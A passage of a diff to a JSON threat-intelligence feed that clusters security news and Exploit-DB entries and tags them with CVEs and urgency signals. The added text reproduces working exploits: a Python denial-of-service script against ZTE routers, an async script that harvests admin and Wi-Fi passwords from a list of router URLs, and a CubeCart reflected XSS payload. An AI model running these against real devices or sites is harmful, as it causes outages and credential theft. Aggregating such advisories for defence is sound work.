-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training ZTE Routers - Unauthenticated Denial of Service EDB-ID: 52594 CVE: 2026-34473 EDB Verified: Author: Mina Nageh Salalma Type: local Exploit: / Platform: Multiple Date: 2026-05-29 Vulnerable App: # Exploit Title: ZTE Routers - Unauthenticated Denial of Service # Date: 2026-05-20 # Exploit Author: Mina Nageh Salalma (Monx Research) # Vendor Homepage: https://www.zte.com.cn # Software Link: https://github.com/minanagehsalalma/cve-2026-34473-unauthenticated-dos-zte-routers # Version: Multiple ZTE router models (17+ confirmed) # Tested on: Multiple ZTE ZXHN models; estimated 140,000+ publicly exposed devices # CVE: CVE-2026-34473 # Description: # The CGILua post.lua parser in 17+ ZTE router models does not enforce a # maximum body size for application/x-www-form-urlencoded POST requests. # An unauthenticated attacker can crash or freeze the router's web service # by sending a single oversized POST request to any CGI endpoint. # No authentication, session, or credentials are required. # # Affected: 17+ ZTE ZXHN router models deployed by ISPs worldwide. # Estimated 140,000+ publicly reachable devices at time of research. # # MITRE CVE: https://www.cve.org/CVERecord?id=CVE-2026-34473 # PoC (Python 3) import requests import sys def dos_exploit(target, size_kb=256): \"\"\" CVE-2026-34473 - Unauthenticated DoS Sends oversized POST body to crash ZTE CGILua web service. \"\"\" url = f\"http://{target}/cgi-bin/luci\" payload = \"a=\" + \"A\" * (size_kb * 1024) headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"} try: r = requests.post(url, data=payload, headers=headers, timeout=15) print(f\"[+] {target} responded with HTTP {r.status_code} (device may still be up)\") except requests.exceptions.ConnectionError: print(f\"[!] {target} - Connection refused or dropped: device web service likely crashed (DoS successful)\") except requests.exceptions.Timeout: print(f\"[!] {target} - Timeout: device web service unresponsive (DoS successful)\") except Exception as e: print(f\"[-] {target}: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: poc.py <target_ip> [payload_size_kb]\") sys.exit(1) size = int(sys.argv[2]) if len(sys.argv) > 2 else 256 dos_exploit(sys.argv[1], size) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
             "ddos"
@@ -3808,10 +3826,13 @@
           "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-34473"
+          ],
           "attack_techniques": [],
           "urgency_signals": [
-            "preauth_unauth"
+            "preauth_unauth",
+            "poc_available"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
@@ -3837,10 +3858,13 @@
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-34473"
+            ],
             "attack_techniques": [],
             "urgency_signals": [
-              "preauth_unauth"
+              "preauth_unauth",
+              "poc_available"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
@@ -3864,7 +3888,9 @@
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-34474"
+        ],
         "attack_techniques": [],
         "urgency_signals": [
           "preauth_unauth"
@@ -3883,15 +3909,17 @@
         "link": "https://www.exploit-db.com/exploits/52592",
         "published": "2026-05-29T00:00:00+00:00",
         "summary": "ZTE H298A / H108N - Unauthenticated Credential Exposure",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training ZTE H298A / H108N - Unauthenticated Credential Exposure EDB-ID: 52592 CVE: 2026-34474 EDB Verified: Author: Mina Nageh Salalma Type: local Exploit: / Platform: Multiple Date: 2026-05-29 Vulnerable App: # Exploit Title: ZTE H298A / H108N - Unauthenticated Credential Exposure via ETHCheat Parameter # Date: 2026-05-20 # Exploit Author: Mina Nageh Salalma (Monx Research) # Vendor Homepage: https://www.zte.com.cn # Software Link: https://github.com/minanagehsalalma/cve-2026-34474-zte-h298a-h108n-sensitive-data-exposure # Version: ZXHN H298A 1.1, ZXHN H108N 2.6 # Tested on: ZTE ZXHN H298A 1.1, ZTE ZXHN H108N 2.6 # CVE: CVE-2026-34474 # Description: # An unauthenticated attacker can retrieve the live administrator password, # WLAN PSK, and ESSID from a ZTE H298A or H108N router by issuing a single # HTTP GET request to /getpage.lua?pid=1000&ETHCheat=1. The device returns # HTML markup containing the fields OBJ_USERINFO_IDPassword1 (admin password), # WLANPSK_KeyPassphrase1 (Wi-Fi PSK), and WLANAP_ESSID1 in plaintext. # A second related endpoint exposes the serial number. # No authentication, session, or cookie is required. # # Affected Firmware: # - ZXHN H298A 1.1 # - ZXHN H108N 2.6 # # MITRE CVE: https://www.cve.org/CVERecord?id=CVE-2026-34474 # Full write-up: https://github.com/minanagehsalalma/cve-2026-34474-zte-h298a-h108n-sensitive-data-exposure import aiohttp import asyncio import html import re import os from colorama import Fore, Style, init init() # Initialize colorama async def get_essid_password(session, url): try: async with aiohttp.ClientSession() as session: # First request async with session.get(\"http://\" + url + \"/getpage.lua?pid=1000&ETHCheat=1\", verify_ssl=False) as response: html_text = await response.text() Admin = re.search(r\"id\\s*=\\s*'OBJ_USERINFO_IDPassword1'\\s*value\\s*=\\s*'([^']+)'\", html_text).group(1) Admin = html.unescape(Admin) ESSID = re.search(r\"id\\s*=\\s*'WLANAP_ESSID1'\\s*value\\s*=\\s*'([^']+)'\", html_text).group(1) ESSID = html.unescape(ESSID) password = re.search(r\"id\\s*=\\s*'WLANPSK_KeyPassphrase1'\\s*value\\s*=\\s*'([^']+)'\", html_text).group(1) password = html.unescape(password) async with session.get(\"http://\" + url + \"/wizard_page/wizard_overETHfail_set_lua.lua\") as response: html_text = await response.text() serial_num = re.search(r\"<ParaName>SerialNumber</ParaName><ParaValue>(.*?)</ParaValue>\", html_text).group(1) serial_num = html.unescape(serial_num) return {\"URL\": url, \"Admin Password\": Admin, \"ESSID\": ESSID, \"WIFI-Password\": password, \"Serial Number\": serial_num} except Exception as e: return {\"URL\": url, \"Admin Password\": \"\", \"ESSID\": \"\", \"WIFI-Password\": \"\", \"Serial Number\": \"\"} async def main(): with open(\"urls.txt\", \"r\") as f: urls = f.read().splitlines() tasks = [] async with aiohttp.ClientSession() as session: for url in urls: tasks.append(get_essid_password(session, url)) results = await asyncio.gather(*tasks) for r in results: print(f\"[+] {r['URL']} | Admin: {r['Admin Password']} | ESSID: {r['ESSID']} | WiFi: {r['WIFI-Password']} | Serial: {r['Serial Number']}\") if __name__ == \"__main__\": asyncio.run(main()) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-34474"
+          ],
           "attack_techniques": [],
           "urgency_signals": [
             "preauth_unauth"
@@ -3918,7 +3946,9 @@
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-34474"
+            ],
             "attack_techniques": [],
             "urgency_signals": [
               "preauth_unauth"
@@ -3943,11 +3973,16 @@
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "Microsoft Windows"
+        ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-44376"
+        ],
         "attack_techniques": [],
         "urgency_signals": [
+          "poc_available",
           "preauth_unauth"
         ],
         "content_type": [
@@ -3964,22 +3999,29 @@
         "link": "https://www.exploit-db.com/exploits/52588",
         "published": "2026-05-29T00:00:00+00:00",
         "summary": "CubeCart < 6.7.0 - Reflected Cross-Site Scripting (XSS) (Unauthenticated)",
-        "full_body": "",
-        "fetch_status": "fetch_failed:ReadTimeout",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CubeCart < 6.7.0 - Reflected Cross-Site Scripting (XSS) (Unauthenticated) EDB-ID: 52588 CVE: 2026-44376 EDB Verified: Author: Th3-SAx11 Type: webapps Exploit: / Platform: Multiple Date: 2026-05-29 Vulnerable App: # Exploit Title: CubeCart < 6.7.0 - Reflected Cross-Site Scripting # Google Dork: intext:\"Powered by CubeCart\" # Date: 2026-04-12 # Exploit Author: Th3-SAx11 ( https://github.com/Th3-SAx11 ) # Vendor Homepage: https://www.cubecart.com/ # Software Link: https://www.cubecart.com/download # Version: 6.x.x # Tested on: Kali Linux / Windows 10 / Firefox # CVE: CVE-2026-44376 # Vulnerability Description: An Unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in CubeCart. The application fails to properly sanitize user-supplied input in the search or catalogue modules before outputting it back to the user. An unauthenticated attacker can inject malicious JavaScript payloads that will be executed in the context of the victim's browser. # Proof of Concept (PoC): 1- Go to the Search Bar on the homepage. 2- Enter a product name that has exactly one result (e.g., SAMSUNG) followed by the payload: SAMSUNG <script>alert(\"Test!\")</script> 3- Press Enter. 4- Observe the alert box popping up on the screen, confirming the XSS execution. # Alternative (Direct Link): https://[TARGET]/cubecart/search?search[keywords]=SAMSUNG%20<script>alert(\"Test!\")</script>&_a=category # Important Note for Reproduction For the payload to execute successfully, the search query must include a valid keyword that matches exactly ONE existing product in the store's database (e.g., SAMSUNG). If the search returns 0 or multiple products, the payload will not trigger. Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "Microsoft Windows"
+          ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-44376"
+          ],
           "attack_techniques": [],
           "urgency_signals": [
-            "preauth_unauth"
+            "preauth_unauth",
+            "poc_available"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
+          "role_map": {
+            "Microsoft Windows": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -3997,16 +4039,23 @@
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "Microsoft Windows"
+            ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-44376"
+            ],
             "attack_techniques": [],
             "urgency_signals": [
-              "preauth_unauth"
+              "preauth_unauth",
+              "poc_available"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
+            "role_map": {
+              "Microsoft Windows": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -4292,16 +4341,14 @@
           }
         },
         {
-          "source": "The Hacker News",
+          "source": "Infosecurity Magazine",
           "cohort": "cyber_news_breach_reporting",
-          "title": "JINX-0164 Targets Cryptocurrency Firms with Fake Recruiter Lures and macOS Malware",
-          "link": "https://thehackernews.com/2026/05/jinx-0164-targets-cryptocurrency-firms.html",
-          "published": "2026-05-28T07:54:48+00:00",
-          "summary": "A new campaign orchestrated by a previously undocumented threat actor has targeted cryptocurrency organizations with an aim to facilitate digital asset theft using recruitment-themed social engineering and bespoke macOS malware. \"These campaigns leveraged sophisticated social engineering techniques, custom macOS malware, and deep targeting of CI/CD infrastructure,\" Wiz researchers Shira Ayal,",
+          "title": "New Threat Actor Jinx-0164 Targets Crypto Developers on macOS",
+          "link": "https://www.infosecurity-magazine.com/news/jinx-0164-crypto-developers-macos/",
+          "published": "2026-05-28T11:30:00+00:00",
+          "summary": "New actor Jinx-0164 hit crypto developers with fake recruiter lures and macOS malware",
           "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
+            "threat_categories": [],
             "actor_attribution": [
               "JINX-0164"
             ],
@@ -4326,14 +4373,16 @@
           }
         },
         {
-          "source": "Infosecurity Magazine",
+          "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
-          "title": "New Threat Actor Jinx-0164 Targets Crypto Developers on macOS",
-          "link": "https://www.infosecurity-magazine.com/news/jinx-0164-crypto-developers-macos/",
-          "published": "2026-05-28T11:30:00+00:00",
-          "summary": "New actor Jinx-0164 hit crypto developers with fake recruiter lures and macOS malware",
+          "title": "JINX-0164 Targets Cryptocurrency Firms with Fake Recruiter Lures and macOS Malware",
+          "link": "https://thehackernews.com/2026/05/jinx-0164-targets-cryptocurrency-firms.html",
+          "published": "2026-05-28T07:54:48+00:00",
+          "summary": "A new campaign orchestrated by a previously undocumented threat actor has targeted cryptocurrency organizations with an aim to facilitate digital asset theft using recruitment-themed social engineering and bespoke macOS malware. \"These campaigns leveraged sophisticated social engineering techniques, custom macOS malware, and deep targeting of CI/CD infrastructure,\" Wiz researchers Shira Ayal,",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
             "actor_attribution": [
               "JINX-0164"
             ],
@@ -4728,87 +4777,6 @@
             "role_map": {
               "Anthropic/Claude": "target"
             },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "b4de02e160",
-      "priority_score": 12,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "critical_cvss"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "Reddit r/blueteamsec",
-        "cohort": "reddit_practitioner_osint",
-        "title": "KB4853: Vulnerability Resolved in Veeam Service Provider Console 9.2.1 - \"A vulnerability in Veeam Service Provider Console allows for remote code execution.\" - CVSS 9.4",
-        "link": "https://www.reddit.com/r/blueteamsec/comments/1tso12c/kb4853_vulnerability_resolved_in_veeam_service/",
-        "published": "2026-05-31T07:03:12+00:00",
-        "summary": "submitted by /u/digicat [link] [comments]",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "critical_cvss"
-          ],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_5_chatter",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Reddit r/blueteamsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "KB4853: Vulnerability Resolved in Veeam Service Provider Console 9.2.1 - \"A vulnerability in Veeam Service Provider Console allows for remote code execution.\" - CVSS 9.4",
-          "link": "https://www.reddit.com/r/blueteamsec/comments/1tso12c/kb4853_vulnerability_resolved_in_veeam_service/",
-          "published": "2026-05-31T07:03:12+00:00",
-          "summary": "submitted by /u/digicat [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "critical_cvss"
-            ],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -5398,6 +5366,87 @@
       ]
     },
     {
+      "cluster_id": "b4de02e160",
+      "priority_score": 11,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "critical_cvss"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/blueteamsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "KB4853: Vulnerability Resolved in Veeam Service Provider Console 9.2.1 - \"A vulnerability in Veeam Service Provider Console allows for remote code execution.\" - CVSS 9.4",
+        "link": "https://www.reddit.com/r/blueteamsec/comments/1tso12c/kb4853_vulnerability_resolved_in_veeam_service/",
+        "published": "2026-05-31T07:03:12+00:00",
+        "summary": "submitted by /u/digicat [link] [comments]",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "critical_cvss"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/blueteamsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "KB4853: Vulnerability Resolved in Veeam Service Provider Console 9.2.1 - \"A vulnerability in Veeam Service Provider Console allows for remote code execution.\" - CVSS 9.4",
+          "link": "https://www.reddit.com/r/blueteamsec/comments/1tso12c/kb4853_vulnerability_resolved_in_veeam_service/",
+          "published": "2026-05-31T07:03:12+00:00",
+          "summary": "submitted by /u/digicat [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "critical_cvss"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "9995e00c02",
       "priority_score": 10,
       "member_count": 1,
@@ -5949,81 +5998,6 @@
       ]
     },
     {
-      "cluster_id": "0c8abca5e9",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Kaspersky Securelist",
-        "cohort": "threat_research_primary",
-        "title": "Pirates in the crosshairs: how one cybercrime gang has been infecting book, movie, and TV show fans for years",
-        "link": "https://securelist.com/video-books-pirates-miners-rat/119943/",
-        "published": "2026-05-28T06:55:11+00:00",
-        "summary": "Our experts continue to track attacks targeting consumers of pirated content, both books and movies. 2026 saw the discovery of new target sites with tens of millions of visitors, while the miner gained a RAT module.",
-        "full_body": "Table of Contents Introduction Link to previous campaigns Potential distribution scale The downloadable archive DLL analysis Main module Watchdog RAT agent The miners Conclusion Indicators of Compromise Authors Konstantin Krasilnikov Valery Akulenko Artem Snegirev Introduction In late April 2026, a client reached out to us for incident response support after discovering a miner running on users’ computers. We later discovered that the malware was being distributed via illegal movie and TV show streaming sites. The infection chain leveraged a fake update for a video player plugin. When the user attempted to watch a video, the player displayed a message saying the plugin version was outdated and asking to install an update to continue. Clicking the link downloaded a ZIP archive with the following contents: The archive contained a legitimate executable, HLS Installer.874.exe , alongside a malicious DLL. Launching the EXE triggered a DLL side-loading mechanism, injecting the malicious module into a legitimate program process and executing code within its context. The library contained the logic for deploying the miner and establishing persistence on the device. At the time of the investigation, the infection risk was associated with two pirated video sites in the .ru and .top TLDs. Link to previous campaigns The current incident does not appear to be an isolated case. After analyzing the infection vector and the logic of the DLL, we concluded that this activity is a continuation of a campaign involving pirated digital libraries, which was previously described by another cybersecurity company . The delivery mechanism for the malicious archive has remained virtually unchanged. Previously, the archive was downloaded in parts from the domain file[.]ipfs[.]us[.]69[.]mu, but this domain was unavailable at the time of our investigation. Instead, the threat actor employed a new website, urush1bar4[.]online. The structure of the archive has also been preserved: inside is a legitimate executable and a large malicious DLL (see the screenshot below). In the course of our research, we also discovered a blog post by NTT Security describing a similar delivery method for a malicious archive. In that instance, the threat actors displayed a fake browser crash page (shown below) while simultaneously downloading an archive to the device with a name starting with chromium-patch-nightly. This scenario resembles the current scheme involving the fake video player plugin update. Given the previously described activity, it’s safe to assume that this campaign has been active since at least 2022. Throughout this entire period, the threat actor has been updating both the downloadable malware and individual parts of the infection mechanism. Potential distribution scale As in previous episodes of the campaign, infections occur via highly popular websites. As of late April 2026, sites linked to the campaign typically displayed extremely high monthly traffic. For instance, the audience for the smallest of the free digital libraries stood at 11,000 users, while the largest reached 4.7 million. For pirated movie and TV show streaming sites, this figure ranged from 2.1 million to 27.4 million. In April, the total number of visits to websites where the malware described in this study was detected reached 40 million. The popularity of these sites increases the potential scale of the miner’s distribution. Furthermore, the campaign is not limited to a single type of platform: the malicious archive is being distributed through both online digital libraries and movie and TV show streaming sites. This broadens the potential range of victims and makes it more difficult to attribute the threat to a single infection vector. The downloadable archive The current version of the downloadable malware is a ZIP archive containing a legitimate EXE file and a malicious DLL. When the executable runs, the library side-loads into its process, triggering the malicious logic. The technical",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Kaspersky Securelist",
-          "cohort": "threat_research_primary",
-          "title": "Pirates in the crosshairs: how one cybercrime gang has been infecting book, movie, and TV show fans for years",
-          "link": "https://securelist.com/video-books-pirates-miners-rat/119943/",
-          "published": "2026-05-28T06:55:11+00:00",
-          "summary": "Our experts continue to track attacks targeting consumers of pirated content, both books and movies. 2026 saw the discovery of new target sites with tens of millions of visitors, while the miner gained a RAT module.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "543e4ad427",
       "priority_score": 10,
       "member_count": 1,
@@ -6105,6 +6079,168 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "0c8abca5e9",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Kaspersky Securelist",
+        "cohort": "threat_research_primary",
+        "title": "Pirates in the crosshairs: how one cybercrime gang has been infecting book, movie, and TV show fans for years",
+        "link": "https://securelist.com/video-books-pirates-miners-rat/119943/",
+        "published": "2026-05-28T06:55:11+00:00",
+        "summary": "Our experts continue to track attacks targeting consumers of pirated content, both books and movies. 2026 saw the discovery of new target sites with tens of millions of visitors, while the miner gained a RAT module.",
+        "full_body": "Table of Contents Introduction Link to previous campaigns Potential distribution scale The downloadable archive DLL analysis Main module Watchdog RAT agent The miners Conclusion Indicators of Compromise Authors Konstantin Krasilnikov Valery Akulenko Artem Snegirev Introduction In late April 2026, a client reached out to us for incident response support after discovering a miner running on users’ computers. We later discovered that the malware was being distributed via illegal movie and TV show streaming sites. The infection chain leveraged a fake update for a video player plugin. When the user attempted to watch a video, the player displayed a message saying the plugin version was outdated and asking to install an update to continue. Clicking the link downloaded a ZIP archive with the following contents: The archive contained a legitimate executable, HLS Installer.874.exe , alongside a malicious DLL. Launching the EXE triggered a DLL side-loading mechanism, injecting the malicious module into a legitimate program process and executing code within its context. The library contained the logic for deploying the miner and establishing persistence on the device. At the time of the investigation, the infection risk was associated with two pirated video sites in the .ru and .top TLDs. Link to previous campaigns The current incident does not appear to be an isolated case. After analyzing the infection vector and the logic of the DLL, we concluded that this activity is a continuation of a campaign involving pirated digital libraries, which was previously described by another cybersecurity company . The delivery mechanism for the malicious archive has remained virtually unchanged. Previously, the archive was downloaded in parts from the domain file[.]ipfs[.]us[.]69[.]mu, but this domain was unavailable at the time of our investigation. Instead, the threat actor employed a new website, urush1bar4[.]online. The structure of the archive has also been preserved: inside is a legitimate executable and a large malicious DLL (see the screenshot below). In the course of our research, we also discovered a blog post by NTT Security describing a similar delivery method for a malicious archive. In that instance, the threat actors displayed a fake browser crash page (shown below) while simultaneously downloading an archive to the device with a name starting with chromium-patch-nightly. This scenario resembles the current scheme involving the fake video player plugin update. Given the previously described activity, it’s safe to assume that this campaign has been active since at least 2022. Throughout this entire period, the threat actor has been updating both the downloadable malware and individual parts of the infection mechanism. Potential distribution scale As in previous episodes of the campaign, infections occur via highly popular websites. As of late April 2026, sites linked to the campaign typically displayed extremely high monthly traffic. For instance, the audience for the smallest of the free digital libraries stood at 11,000 users, while the largest reached 4.7 million. For pirated movie and TV show streaming sites, this figure ranged from 2.1 million to 27.4 million. In April, the total number of visits to websites where the malware described in this study was detected reached 40 million. The popularity of these sites increases the potential scale of the miner’s distribution. Furthermore, the campaign is not limited to a single type of platform: the malicious archive is being distributed through both online digital libraries and movie and TV show streaming sites. This broadens the potential range of victims and makes it more difficult to attribute the threat to a single infection vector. The downloadable archive The current version of the downloadable malware is a ZIP archive containing a legitimate EXE file and a malicious DLL. When the executable runs, the library side-loads into its process, triggering the malicious logic. The technical",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Kaspersky Securelist",
+          "cohort": "threat_research_primary",
+          "title": "Pirates in the crosshairs: how one cybercrime gang has been infecting book, movie, and TV show fans for years",
+          "link": "https://securelist.com/video-books-pirates-miners-rat/119943/",
+          "published": "2026-05-28T06:55:11+00:00",
+          "summary": "Our experts continue to track attacks targeting consumers of pirated content, both books and movies. 2026 saw the discovery of new target sites with tens of millions of visitors, while the miner gained a RAT module.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "787e234466",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Horizon3 Attack Research",
+        "cohort": "offensive_vulnerability_research",
+        "title": "Rapid Response",
+        "link": "https://horizon3.ai/downloads/factsheets/rapid-response/",
+        "published": "2026-05-29T16:00:00+00:00",
+        "summary": "Rapid Response enables organizations to quickly determine which emerging vulnerabilities create real exploitability risk, prioritize remediation, and verify fixes before attackers operationalize threats.",
